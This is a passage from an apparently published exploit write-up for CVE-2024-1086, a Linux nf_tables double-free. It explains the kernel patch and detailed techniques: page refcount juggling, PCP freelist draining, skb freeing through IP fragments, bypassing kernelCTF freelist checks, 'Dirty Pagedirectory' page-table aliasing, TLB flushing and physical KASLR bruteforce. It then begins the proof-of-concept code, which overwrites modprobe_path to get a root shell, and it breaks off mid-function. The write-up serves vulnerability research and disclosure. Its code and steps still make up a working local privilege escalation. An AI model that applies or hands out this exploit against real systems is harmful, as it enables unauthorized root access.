+	case NF_DROP:
+	case NF_QUEUE:
+		break;
 	case NFT_CONTINUE:
 	case NFT_BREAK:
 	case NFT_RETURN:
@@ -11032,6 +11026,8 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,

 		data->verdict.chain = chain;
 		break;
+	default:
+		return -EINVAL;
 	}

 	desc->len = sizeof(data->verdict);
--
```

Codeblock 3.4.2: C code diff of the `nft_verdict_init()` kernel function being patched against the bug.

You can learn more about their fix on the kernel lore website: ["[PATCH nf] netfilter: nf\_tables: reject QUEUE/DROP verdict parameters."](https://lore.kernel.org/all/20240120215012.129529-1-fw%40strlen.de)

## 4. Techniques

### 4.1. Page refcount juggling

The first technique required for the exploit is juggling page refcounts. When we attempt to double-free a page in the kernel using the dedicated API functions, the kernel will check the refcount of the page:

```
void __free_pages(struct page *page, unsigned int order)
{
	/* get PageHead before we drop reference */
	int head = PageHead(page);

	if (put_page_testzero(page))
		free_the_page(page, order);
	else if (!head)
		while (order-- > 0)
			free_the_page(page + (1 << order), order);
}
```

Codeblock 4.1.1: C code of the `__free_pages()` kernel function with original comments.

The refcount is usually 1 before we free the page (unless it is shared or something, then it is higher). If the pages' refcount is below 0 after it is decremented, it will refuse to free the page (`put_page_testzero()` will return false). This means that we shouldn't be able to double-free pages... unless?

The active readers will notice that several child-pages will then be freed until `order-- == 0`. However, after the first page free the page order is set to 0. Hence during the 2nd free where said code gets ran, no pages will be freed since `order-- == -1`. The fact that the page order gets set to 0 after a page free will be abused to convert the double-free pages to order 0 in the "Setting page order to 0" technique section.

In the context of a double-free: when we free the page for the 1st time, the refcount will be decremented to 0 and hence the page will be freed as the code above allows it to be. However, when we try free the page for 2nd time, the refcount will be decremented to -1 and it will not be freed since the refcount != 0 and may even raise a BUG() if `CONFIG_DEBUG_VM` is enabled.

So, how do we double-free pages then? Simple: allocate the page again before the 2nd free, as the free will look like a non-double-free free considering there is an actual object in the page. This can be any object with the same size, such as a slab or a pagetable, which is what I'm utilizing with the exploit.

In the most simplistic form, the implementation of this technique will look like this:

```
static void kref_juggling(void)
{
    struct page *skb1, *pmd, *pud;

    skb1 = alloc_page(GFP_KERNEL);  // refcount 0 -> 1
    __free_page(skb1);  // refcount 1 -> 0
    pmd = alloc_page(GFP_KERNEL);  // refcount 0 -> 1
    __free_page(skb1);  // refcount 1 -> 0
    pud = alloc_page(GFP_KERNEL);  // refcount 0 -> 1

    pr_err("[*] skb1: %px (phys: %016llx), pmd: %px (phys: %016llx), pud: %px (phys: %016llx)\n", skb1, page_to_phys(skb1), pmd, page_to_phys(pmd), pud, page_to_phys(pud));
}
```

Codeblock 4.1.2: C code of a custom kernel module, containing comments describing page refcounts.

In terms of cleaning this up post-exploitation, it's incredibly easy: just free both objects at will, as the kernel will refuse to double-free the page because of the refcount. :-)

### 4.2. Page freelist entry order 4 to order 0

When an allocation happens through `__do_kmalloc_node()` (such as skb's), the size of the allocated object is checked against `KMALLOC_MAX_CACHE_SIZE` (the maximum slab-allocator size). If the object is larger than that, one of the page allocators will be used instead of the slab-allocator. This is useful when we want to deterministically free pages like the skb data and allocate pages like PTE pages using the same algorithms and freelists. However, the value of `KMALLOC_MAX_CACHE_SIZE` is equivalent to `PAGE_SIZE * 2`, which means that kmalloc will be using the page allocators for allocations above order 1 (2 pages, or 8096 bytes).

Unfortunately enough, some objects we may want to target are exclusively allocated by page allocators whilst still falling within the size of the slab-allocator. For example, a developer may use `alloc_page()` instead of `kmalloc(4096)`, because this saves overhead. An example of this is a PTE page (or any other pagetable page for that sake), which uses page allocations of order 0 (1 page, or 4096 bytes).

If we would double-free an object of 4096 bytes (an order==0 page) handled by the slab-allocator, it would end up in the slabcaches, not in the pagecache. Hence, in order to double-alloc pages in the order==0 freelist, we need to convert the order 4 (16 page) freelist entries from our double-free to the order 0 (1 page) freelist entries.

Luckily, I found 2 methods to allocate order==0 pages with order==4 page freelist entries.

#### 4.2.1. Draining the PCP list

This method takes advantage of the fact that the PCP-allocator is basically a set of per-CPU freelists for the buddy-allocator. When one of those PCP freelists are empty, it will refill pages from the buddy-allocator.

> For a functional overview of the page allocation process (including if statements, and the slab-allocator and buddy-allocator), check the page allocation subsection in the background section.

![](https://pwning.tech/content/images/2024/03/pcp_refill-3.svg)

Illustration 4.2.1.1: Timeline of memory operations to set a page order to 0.

The refill happens in bulks of `count = N/order` page objects. Hence, the function `rmqueue_bulk()` (which is used for the refill) allocates `count` pages with order `order` from the buddy-allocator. When allocating a page from the buddy-allocator, it will traverse the buddy page freelist, and if the buddy freelist entries' order >= `order`, then it will return this page for the refill. If the buddy freelist entries' order > `order`, then the buddy-allocator will internally divide the page.

Notice that our exploit double-free's order==4 pages, and needs to fill those with order==0 PCP pages. When we free it, the order==4 page is added to the buddy-freelist. For our exploit we want to place an order==0 page into these 16 pages, because the order==4 page will be double-freed. The allocation for order==0 pages happens with the PCP allocator, which has per-order freelists. However, the PCP-refill mechanism will take any buddy-page if it fits. Hence, we can allocate 16 PTE pages into the double-freed order==4 page.

As said, in order to trigger this mechanism we must first drain the PCP freelist for the target CPU by spraying page allocations. In my exploit I do this by spraying PTE pages, and this is directly related to the Dirty Pagedirectory technique. Because we cannot tell if the PCP freelist was drained, we need to assume one of the sprayed objects is allocated in the double-free object. Hence, I spray PTE objects so an PTE object takes the spot of one of the double-free'd buddy pages. If I wanted to allocate an PMD object, I would spray PMD objects, et cetera.

The amount of objects in the freelists differs per system and per resource usage. For the exploit I used 16000 PTE objects which is - in all cases I encountered - enough to empty the freelist.

```
static int rmqueue_bulk(struct zone *zone, unsigned int order,
			unsigned long count, struct list_head *list,
			int migratetype, unsigned int alloc_flags)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&zone->lock, flags);
	for (i = 0; i < count; ++i) {
		struct page *page = __rmqueue(zone, order, migratetype, alloc_flags);
		if (unlikely(page == NULL))
			break;

		list_add_tail(&page->pcp_list, list);
		// [snip] set stats
	}

    // [snip] set stats
	spin_unlock_irqrestore(&zone->lock, flags);

	return i;
}
```

Codeblock 4.2.1.2: C code of the `rmqueue_bulk()` kernel function, which refills the PCP freelist.

#### 4.2.2. Race condition (obsolete)

**>> This technique is obsolete, but was used for kernelctf exploit <<**

The first free() append the page to the correct freelist, and will set the page order to 0. However when doing a double-free (2nd free), the page will be added to the freelist for order 0 since that's what the page order is for that page. This way, we can add order==4 pages to the order==0 freelists with a double-free primitive.

![](https://pwning.tech/content/images/2024/02/converting_page_order-1.svg)

Illustration 4.2.2.1: Timeline of memory operations to set a page order to 0.

Less luckily, this technique is a race condition. When a page is freed for the 2nd time without a intercepting alloc (`free; free; alloc; alloc`), the refcount of the page will drop below 0 and will not allow a double-free, so we need to do page reference juggling (`free; alloc; free; alloc`). However, then the order will not be 0 at the 2nd free, because the alloc will set the order to the original amount (i.e. order 4). Now, converting the page to order 0 seems impossible since it should be either no free at all (refcount -1), or the page being the original order (proper scenario). Enter: the race condition.

When a page is freed its order is passed by value. This means that if the double-freed page gets allocated during the 2nd free, it will be allocated to the freelist of order 0 and will have the refcount incremented, so it will not hit -1 and be 0 as it should be. As you can imagine, the race window is quite small since it consists of a few function calls. However, the `free_large_kmalloc()` function prints a kernel WARN() to dmesg if the order is 0, which it is because of the double-free. Usually, this only provides 1ms for the window, but for virtualized systems like QEMU VMs with serial terminals, the window is 50ms-300ms, which is more than enough to hit.

Now we have successfully attached the page the order 0 freelist, which means that we can now overwrite the page with any order-0 page allocation. We can also convert the 1st page reference (acquired with the 1st free) by freeing that object and reallocating it as a new object since the page order will persist. If we are using page refcount juggling, we want to free the object which took the first freed reference.

### 4.3. Freeing skb instantly without UDP/TCP stacks

When we are avoiding freelist corruption checks, we may want to free a certain skb directly at will at an arbitrary time, so our exploit can work in a very fast, synchronous manner with less chance of corruption.

> Note that this behaviour is typically done with local UDP packets, but the skb gets corrupted after the first free in the double-free, which means I cannot use the TCP or UDP stacks for this, which utilized corrupted fields.

> **OBSOLETE (KERNELCTF EXPLOIT)**: Alternatively, we may want to free a certain skb on a specific CPU to bypass double-free detection, since the sk\_buff freelist is per-CPU. This means that if we double-free an object across 2 CPUs directly after each other, the double-free will not be detected. We cannot "shoot the previous skb to the moon" (a.k.a. allocating a never expiring skb) to prevent double-free detection since this would alter the skb head pages by either changing the pointer, or by allocating the same pointer from the freelist preventing an double-free anyways.

Fortunately, IP packet fragmentation and its fragment queues exist. When an IP packet is waiting for all its fragments to be received, the fragments are placed into an IP frag queue (red-black tree). When the received fragments have the expected length of the full IP packet, the packet is reassembled on the CPU the last fragment came from. Please note that this IP frag queue has a timeout of `ipfrag_time` seconds, which will free all skb's. Changing this timeout is mentioned in the subsection hereafter.

If we wanted to switch the freelist of skb freelist entry `skb1` from CPU 0 to CPU 1, we would allocate it as an IP fragment to a new IP frag queue on CPU 0. Then, we send `skb2` - the final IP fragment for the queue on CPU 1. This causes `skb1` to be freed on CPU 1.

This same behaviour can be used to free skb's at will, without using UDP/TCP code. This is benificient for the exploit, since the double-free packet is corrupted when it is freed for the first time. If we would use UDP code, the kernel would panic due to all sorts of nasty behaviour.

![](https://pwning.tech/content/images/2024/02/switching_skb_cpu-1.svg)

Illustration 4.3.1: Timeline of activities to switch an skb's per-CPU freelist.

Unfortunately, the IP fragment queue's final size is determined by `skb->len`, which is fully randomized after the free due to overlaps with the slabcache's `s->random`. For details, check the next subsection. This means that it is practically impossible to complete the IP frag queue consistently because it will use a random expected length.

Hence, I came up with a different strategy: instead of completing the IP frag queue we make it raise an error using invalid input. This will cause all skb's in the IP frag queue to be freed instantaneously on the CPU of the erroring skb, regardless of `skb->len`.

> When implementing this technique yourself, note that double-free detection (`CONFIG_FREELIST_HARDENED`) will be triggered if you do not append "innocent" skb objects between free `skb1` and alloc `skb2`. For demonstrative purposes these have been left out in the diagram, but are included in the PoC sections.

#### 4.3.1. Modifying skb max lifetime

For our exploit we may want skb's to live shorter or longer, depending on the usecase. Luckily, the kernel provides an userland interface to configure IP fragmentation queue timeout times over at `/proc/sys/net/ipv4/ipfrag_time`. This is specific per network namespace, and can hence be set as unprivileged user in their own networking namespace.

When we use IP fragments to reassemble an split IP packet, the kernel will wait `ipfrag_time` seconds before issuing a timeout. If we set `ipfrag_time` to 999999 seconds, the kernel will let the fragment skb live for 999999 seconds. Invertedly, we can also set it to 1 second if we want to swiftly allocate and deallocate an skb on a random CPU.

```
static void set_ipfrag_time(unsigned int seconds)
{
	int fd;

	fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY);
	if (fd < 0) {
		perror("open$ipfrag_time");
		exit(1);
	}

	dprintf(fd, "%u\n", seconds);
	close(fd);
}
```

Codeblock 4.3.1.1: C code of an userland function to set the `ipfrag_time` variable.

### 4.4. Bypassing KernelCTF skb corruption checks

The only mitigation I had to actively bypass in the KernelCTF mitigation instance were freelist corruption checks, specifically the one that checks if the freelist next ptr in an object being allocated is corrupted.

Unfortunately, the freelist next ptr overlaps with `skb->len` since `skbuff_head_cache->offset == 0x70`. This means that the next/previous freelist entry pointer is stored at `sk_buff+0x70`, which coincidentally overlaps with `skb->len`. Online sources told me `s->offset` is usually set to half the slab size by kernel developers to avoid OOB writes from being able to overwrite freelist pointers, which in the past led to easy privesc using OOB bugs.

After the 1st `skb` free, the `skb->len` field gets overwritten with a partial next ptr value. In the code leading up to `skb`'s 2nd free, the `skb->len` field gets modified because of packet parsing. Hence, the freelist next ptr gets corrupted even before the 2nd `skb` free.

When we try to allocate the freelist entry of the 1st `skb` free (after said corruption) using `slab_alloc_node()`, the freelist next ptr in the freed object gets flagged for corruption in calls invoked by `freelist_ptr_decode()`:

```
static inline bool freelist_pointer_corrupted(struct slab *slab, freeptr_t ptr,
	void *decoded)
{
#ifdef CONFIG_SLAB_VIRTUAL
	/*
	 * If the freepointer decodes to 0, use 0 as the slab_base so that
	 * the check below always passes (0 & slab->align_mask == 0).
	 */
	unsigned long slab_base = decoded ? (unsigned long)slab_to_virt(slab) : 0;

	/*
	 * This verifies that the SLUB freepointer does not point outside the
	 * slab. Since at that point we can basically do it for free, it also
	 * checks that the pointer alignment looks vaguely sane.
	 * However, we probably don't want the cost of a proper division here,
	 * so instead we just do a cheap check whether the bottom bits that are
	 * clear in the size are also clear in the pointer.
	 * So for kmalloc-32, it does a perfect alignment check, but for
	 * kmalloc-192, it just checks that the pointer is a multiple of 32.
	 * This should probably be reconsidered - is this a good tradeoff, or
	 * should that part be thrown out, or do we want a proper accurate
	 * alignment check (and can we make it work with acceptable performance
	 * cost compared to the security improvement - probably not)?
	 */
	return CHECK_DATA_CORRUPTION(
		((unsigned long)decoded & slab->align_mask) != slab_base,
		"bad freeptr (encoded %lx, ptr %p, base %lx, mask %lx",
		ptr.v, decoded, slab_base, slab->align_mask);
#else
	return false;
#endif
}
```

Codeblock 4.4.1: C code of the kernel function `freelist_pointer_corrupted()` (KernelCTF mitigation instance), including the original comments.

After some research, I figured out that this check is not ran retroactively: when we free an object on top of the object with a corrupted freelist entry, the mitigation does not check if the previous object has a corrupted next ptr. This means that we can mask an invalid next ptr by freeing another skb after it, and then allocate that skb again with the data of the old skb. This basically masks the original corrupted skb, whilst still being able to double-alloc the skb data.

The diagram below tries to explain this phenomenon by performing a double-free on an skb object like the exploit in this blogpost.

![](https://pwning.tech/content/images/2024/02/bypass_freelist_corruption-2.svg)

Illustration 4.4.2: Sequence overview of bypassing the freelist corruption detection in the KernelCTF mitigation kernel.

The KernelCTF devs could mitigate this by checking the freelist head next ptr for corruption when freeing, not only when allocating.

### 4.5. Dirty Pagedirectory

#### 4.5.1. The train of thought

Dirty Pagetable is one of the most interesting techniques I have encountered so far. When I was researching ready-made techniques to exploit the double-free bug Dirty Pagetable came to surface, and it seemed like a perfect technique.

However I did realize that consistent writing to the PTE page would be an unpleasant experience in the context of my double-free bug. I was unable to find any page-sized objects which allowed to be fully overwritable with userdata, whilst also being in the same page freelist as the PTE pages. I did not want to use cross-cache attacks for stability and compatiblity related reasons, as this would introduce more complexity into the exploit.

Next came a night full of brainstorming which gave me the following idea: considering I have a double-free in the same freelist as PTEs - what if it were possible to double allocate PTEs across processes, such as sudo and the exploit. This would essentially perform memory sharing (pointing the exploit virtual addresses to sudo's physical addresses) between the two completely unrelated processes. Hence, it would presumably be possible to manipulate the application data of an process running under root, and leverage that for a root shell. This turned out to be a bit unpractical considering there were other allocations happening as a process gets started, so there would need to be very good position management on the freelist.

This gave me the next idea: what if it were possible to double-allocate an exploit PTE page and an exploit PMD page, as this would mean that the PMD would dereference the PTE's page (as PTE value) as PTE and hence resolve the PTE's userland pages as PTE.

Fortunately enough, this PMD+PTE approach works. Alternatives such as PUD+PMD have been confirmed working as well, and perhaps PGD+PUD works too. The only difference is the amount of pages simulationously mirrored: 1GiB pages with PTE+PMD, 512GiB with PUD+PMD, and presumably 256TiB with PGD+PUD (if this is even possible). Keep in mind that this has impact on memory usage, and the system may go OOM with too much memory mirrored.

Additionally, the integration of Dirty Pagedirectory needs to be considered when choosing between PMD+PTE and PUD+PMD. I explain this in the PTE spraying section, but in general PMD+PTE should be the best choice.

#### 4.5.2. The technique

The Dirty Pagedirectory technique allows unlimited, stable read/write to any memory page based on physical addresses. It can bypass permissions by setting its own permission flags. This allows our exploit to write to read-only pages like those containing `modprobe_path`.

> **In this section I explain PUD+PMD, but it boils down to the same as the PMD+PTE strategy from the PoC exploit.**

The technique is quite simplistic in nature: allocate a Page Upper Directory (PUD) and Page Middle Directory (PMD) to the same kernel address using a bug like a double-free. The VMAs should be seperate, to avoid conflicts (a.k.a. do not allocate the PMD within the area of the PUD). Then, write an address to the page in the PMD range and read the address in the corresponding page of the PUD range. The diagram below tries to explain this phenomenon (complementary to the example under it).

![](https://pwning.tech/content/images/2024/03/dirtypagedirectory.svg)

Illustration 4.5.2.1: Hierachy overview of the Dirty Pagedirectory technique, including required memory operations.

To make things more hands-on, let's imagine the following scenario: the infamous `modprobe_path` variable is stored in a page at PFN/physical address `0xCAFE1460`. We apply Dirty Pagedirectory: double-allocate the PUD page and PMD page via mmap for respective userland VMA ranges `0x8000000000 - 0x10000000000` (`mm->pgd[1]`) and `0x40000000 - 0x80000000` (`mm->pgd[0][1]`).

This automatically means that `mm->pgd[1][x][y]` is always equal to `mm->pgd[0][1][x][y]` because both `mm->pgd[1]` and `mm->pgd[0][1]` refer to the address/object as we double-allocated them. Observe how `mm->pgd[0][1][x][y]` is a userland page, and that `mm->pgd[1][x][y]` is a PTE. This means that the dedicated PUD area will interpret a userland page from the PMD area like a PTE.

Now, to read the physical page address `0xCAFE1460` we set first entry of the PUD areas' PTE value to `0x80000000CAFE1867` (added PTE flags) by writing that value to `0x40000000` (a.k.a. userland address for page @ `mm->pgd[0][1][0][0]+0x0`). Because of the entanglement rule above, this means that we wrote that value to the PTE address for page @ `mm->pgd[1][0][0]+0x0`, since `mm->pgd[1][0][0] == mm->pgd[0][1][0][0]`. Now, we can dereference that malicious PTE value by reading page `mm->pgd[1][0][0][0]` (last index 0 since we wrote it to the first 8 bytes of the PTE: notice `0x0` above). This is equal to userland page `0x8000000000`.

Because the PTE is now changed from userland, we need to flush the TLB because the TLB will contain outdated record. Once that's done, `printf('%s', 0x8000000460);` should print `/sbin/modprobe` or whatever value `modprobe_path` is. Naturally, we can now overwrite `modprobe_path` by doing `strcpy((char*)0x8000000460, "/tmp/privesc.sh");` (there's `KMOD_PATH_LEN` bytes padding) and drop a root shell. This does not require TLB flushing because the PTEs themselves have not changed when writing to the address.

> Observe how we set the read/write flags in PTE value `0x80000000CAFE1867`. Note that `0x8` in virtual address `0x8000000460` and PTE value`0x80000000CAFE1867` has nothing to do with each other: in the PTE value it is a flag turned on, and the virtual address just happens to start with `0x8`.

This boils down to: write PTE values to userland pages in the VMA range of `0x40000000 - 0x80000000`, and dereference them by reading and writing corresponding userland pages in the VMA range of `0x8000000000 - 0x10000000000`.

#### 4.5.3. The mitigations

I have used this technique to bypass a lot of mitigations currently in the kernel (among others: virtual KASLR, KPTI, SMAP, SMEP, and `CONFIG_STATIC_USERMODEHELPER`), albeit other mitigations are bypassed in the PoC exploit with a little redneck engineering.

When this technique was peer-reviewed I got asked how it was able to bypass SMAP. The answer is quite simple: SMAP only works with virtual addresses and not for physical memory addresses. PTEs are referred to in PMDs by their physical address. This means that when a PTE entry in a PMD is a userland page, it will not be detected by SMAP because it is not a virtual addresses. Hence, the PUD area can happily use the userland page as a PTE without SMAP intereference.

It would be possible to mitigate this technique by setting an table entries' type in the entry and use it to detect when a PMD is allocated on the place of an PUD since we cannot forge PMD entries and PUD entries themselves. An example is setting type 0 for PTEs, 1 for PMDs, 2 for PUDs, 3 for P4Ds, 4 for PGDs, et cetera. However, this would require `2log(levels)` bits to be set in each table entry (3 bits when P4D is enabled, since levels=5) which would sacrifice space intended for features in the future, as well as the runtime checks presumably introducing a great deal of overhead since each level for each memory access has to be checked. Additionally, this mitigation would still allow for forced memory sharing (i.e. overlapping an exploit PTE page with an PTE page of sudo, running as root).

### 4.6. Spraying pagetables for Dirty PD

You may notice that that the Dirty Pagedirectory section above mentions PUD+PMD, but the proof-of-concept uses PMD+PTE. This is related to the fact that the exploit drains the PCP list to allocate a PTE in the double-free'd address.

First off, pagetables are allocated by the kernel on demand, so if we mmap'd a virtual memory area the allocation does not happen. Only when we actually read/write this VMA it will allocate the required pagetables for the accessed page. When allocating a PUD for instance, the PMD, PTE, and userland page will be allocated. When allocating a PTE, the target userland page will also be allocated.

The original Dirty Pagetable paper mentions that - very elegantly - you can spray specific pagetable levels by allocating the parents first, since a parent (i.e. PMD) contains 512 children (PTEs). Hence, if we wanted to spray 4096 PTEs, we would need to pre-allocate 8 (`4096/512 = 8`) PMDs, before allocating the PTEs.

If we spray PMDs, the PTEs will be allocated as well - from the same freelist. This means that 50% of the spray is PMD, and 50% is PTE. If we would spray PUDs, it would be 33% PUD, 33% PMD, and 33% PTE. Hence, if we spray PTEs, it will be 100% PTE since we are not doing any other allocations. Because of this, we use PMD+PTE in the exploit and not PUD+PMD, and spraying PMDs means 50% less stability.

> Note that userland pages themselves are allocated from a different freelist (migratetype 0, not migratetype 1).

### 4.7. TLB Flushing

TLB flushing is the practice of removing or invalidating all entries in the translation lookaside buffer (virtual address to physical address caching). In order to scan addresses reliably using the Dirty Pagedirectory technique, we need to come up with a TLB flushing technique that satisfies the following requirements:

* **Does not modify existing process pagetables**
* **Has to work 100% of the time**
* Has to be quick
* Can be triggered from userland
* Has to work regardless of PCID

Based upon these requirements I came up with the following idea: when allocating PMD and PTE memory areas you should mark them as shared, and then fork() the process, make the child munmap() it for a flush, and make the child go to sleep (to avoid crashes if the underlying exploit is unstable). The result is the following function:

```
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		PRINTF_VERBOSE("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}
```

Codeblock 4.7.1: C code of an userland function which flushes the TLB for a certain virtual memory range.

The locking mechanism prevents the parent from continuing execution before the child has flushed the TLB. It could presumably be removed if the child performs a process exit instead of sleeping, as the parent could monitor for the childs process state.

This TLB flushing method has worked 100% of the times to refresh pagetables and pagedirectories. It has been tested on a recent AMD CPU and in QEMU VMs. It should be hardware independent, since the flush HAS to be triggered from the kernel in this usecase.

### 4.8. Dealing with physical KASLR

Physical Kernel Address Space Layout Randomization (Physical KASLR) is the practice of randomizing the physical base address of the Linux kernel. Usually, this is not important since nearly all exploits work with virtual memory (and therefore have to deal with virtual KASLR).

However, because of the nature of our exploit - which utilizes Dirty Pagedirectory - we need to have the physical address of the memory we want to read/write to.

#### 4.8.1. Getting the physical kernel base address

Usually, this means we would need to bruteforce the entire physical memory range to find the physical target address.

> Physical memory refers to all forms usable of physical memory addresses: e.g. on a laptop 16GiB RAM stick + 1GiB builtin MMIO = 17GiB physical memory on the device.

However, one of the quirks of the Linux kernel is that the physical kernel base address has to be aligned to `CONFIG_PHYSICAL_START` (i.e. `0x100'0000` a.k.a. 16MiB) bytes if `CONFIG_RELOCATABLE=y`. If `CONFIG_RELOCATABLE=n`, the physical kernel base address will be exactly at `CONFIG_PHYSICAL_START`. For this technique, we assume `CONFIG_RELOCATABLE=y`, since it would not make sense to bruteforce physical KASLR if we knew the address.

> If `CONFIG_PHYSICAL_ALIGN` is set, this value will be used for the alignment instead of `CONFIG_PHYSICAL_START`. Note that `CONFIG_PHYSICAL_ALIGN` is usually smaller, like `0x20'0000` a.k.a. 2MiB, which means more addresses need to be bruteforced (8 times more than with an alignment of `0x100'0000`).

Assuming the target device has 8GiB physical memory, this means that we can reduce our search area to `8GiB / 16MiB = 512` possible physical kernel base addresses since we know the base address has to be aligned to `CONFIG_PHYSICAL_START` bytes. The advantage is that we only have to check the first few bytes of the first page of the 512 addresses to check if that page is the kernel base.

We can essentially figure out the physical kernel base address by bruteforcing a few hundred physical addresses. Fortunately, Dirty Pagedirectory allows for unlimited read/writes of entire pages, and hence allows us to read 4096 bytes per physical (page) address, and even more fortunately 512 page addresses per PTE overwrite. This requires us to only overwrite the PTE once to figure out the physical kernel base address if our machine has 8GiB memory.

In order to properly recognize which of those 512 physical addresses contains the kernel base, I have written [get-sig](https://github.com/Notselwyn/get-sig): a few Python scripts to generate a giant memcmp-powered if statement which finds overlapping bytes between different kernel dumps.

#### 4.8.2. Getting the physical target address

When we find the physical base address, we can find the final target address of our read/write operation - if it resides within the kernel area - using hardcoded offsets based on the physical kernel base, or by scanning the `~80MiB` physical kernel memory area for data patterns of the target.

The data scanning technique requires `1 + 80MiB/2MiB ~= 40` PTE overwrites on a system with 8GiB memory. If we have access to Dirty Pagedirectory and the format of the target data is unique (like `modprobe_path`'s buffer), the data pattern scanning method is better due to broader compatibility across kernel versions, and especially if we do not know the offsets when compiling the exploit.

Please note `~80MiB` for the memory scanning technique is an estimation and will probably be less in reality, and it can even be optimized to a smaller memory area because certain targets may reside at certain areas which have a certain offset. For example, kernel code may appear from offset `+0x0` from the base address, whilst kernel data may always start from e.g. `+0x1000000` regardless of the kernel used because the kernel size remains pretty consistent. Hence, if we were searching for `modprobe_path`, we could simply start at `+0x1000000`, but this has not been tested.

## 5. Proof of Concept

### 5.1. Execution

Let's breach the mainframe, shall we? The general outlines of the exploit can be derived from the diagram below. In this section I'm trying to link the subsections to this diagram for clarity.

> Note that the exploit in this section refers to the new version, not the original KernelCTF mitigation exploit (the new one works on the mitigation instance as well). That write-up will be published seperately in the KernelCTF repository.

Feel free to read along with the source code of the exploit, which is available in my [CVE-2024-1086 PoC repository](https://github.com/Notselwyn/CVE-2024-1086).

![](https://pwning.tech/content/images/2024/03/-gameplanv2-5.svg)

Illustration 5.1.1: An birdseye execution overview of the exploit stages.

#### 5.1.1. Setting up the environment

To trigger the bug we need to set up a certain network environment and usernamespaces.

##### 5.1.1.1. Namespaces

For the LPE exploit, we need the unprivileged-user namespaces option set to access nf\_tables. This should be enabled by default on major distro's like Debian and Ubuntu. As such, those distrobutions have a bigger attack surface than distro's which do not allow unprivileged usernamespaces. This can be checked using `sysctl kernel.unprivileged_userns_clone`, and `1` means it is enabled:

```
$ sysctl kernel.unprivileged_userns_clone
kernel.unprivileged_userns_clone = 1
```

Codeblock 5.1.1.1.1: The CLI command for checking if unprivileged user namespaces are enabled.

We create the required user and network namespaces in the exploit using:

```
static void do_unshare()
{
    int retv;

    printf("[*] creating user namespace (CLONE_NEWUSER)...\n");

	// do unshare seperately to make debugging easier
    retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    printf("[*] creating network namespace (CLONE_NEWNET)...\n");

    retv = unshare(CLONE_NEWNET);
    if (retv == -1)
	{
		perror("unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}
}
```

Codeblock 5.1.1.1.2: The `do_unshare()` exploit function written in C, which creates the user and network namespaces.

Afterwards, we give ourselves namespace root access by setting UID/GID mappings using:

```
static void configure_uid_map(uid_t old_uid, gid_t old_gid)
{
    char uid_map[128];
    char gid_map[128];

    printf("[*] setting up UID namespace...\n");

    sprintf(uid_map, "0 %d 1\n", old_uid);
    sprintf(gid_map, "0 %d 1\n", old_gid);

    // write the uid/gid mappings. setgroups = "deny" to prevent permission error
    PRINTF_VERBOSE("[*] mapping uid %d to namespace uid 0...\n", old_uid);
    write_file("/proc/self/uid_map", uid_map, strlen(uid_map), 0);

    PRINTF_VERBOSE("[*] denying namespace rights to set user groups...\n");
    write_file("/proc/self/setgroups", "deny", strlen("deny"), 0);

    PRINTF_VERBOSE("[*] mapping gid %d to namespace gid 0...\n", old_gid);
	write_file("/proc/self/gid_map", gid_map, strlen(gid_map), 0);

#if CONFIG_VERBOSE_
    // perform sanity check
    // debug-only since it may be confusing for users
	system("id");
#endif
}
```

Codeblock 5.1.1.1.3: The `configure_uid_map()` exploit function written in C, which sets up the user and group mappings.

##### 5.1.1.2. Nftables

In order to trigger the bug, we need to set up hooks/rules with the malicious verdict. I will not display the full code here to prevent clutter, so feel free to check the Github repo. However, I use the function below to set the precise verdict.

```
// set rule verdict to arbitrary value
static void add_set_verdict(struct nftnl_rule *r, uint32_t val)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("immediate");
	if (e == NULL) {
		perror("expr immediate");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val);

	nftnl_rule_add_expr(r, e);
}

```

Codeblock 5.1.1.2.1: The `add_set_verdict()` exploit function written in C, which registers the malicious Netfilter verdict causing the bug.

##### 5.1.1.3. Pre-allocations

Before we start the actual exploitation part of the program, we need to pre-allocate some objects to prevent allocator noise, since there may be sensitive areas in the exploit where it may fail if there is too much noise in the background. This is not rocketscience, and more of a chore than technical magic.

Note the `CONFIG_SEC_BEFORE_STORM` which waits for all allocations in the background to finish, in case some allocations are happening across CPUs. This considerably slows down the exploit (1 second -> 11 seconds), but it definitively increases exploit stability on systems where there may be a lot of background noise. Ironically enough, the success rate increased 93% -> 99,4% (n=1000) **without** the sleep, on systems with barely any workload (like the kernelctf image), so play around with this value as you like.

```
static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
	unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

	printf("[+] running normal privesc\n");

    PRINTF_VERBOSE("[*] doing first useless allocs to setup caching and stuff...\n");

	pin_cpu(0);

	// allocate PUD (and a PMD+PTE) for PMD
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
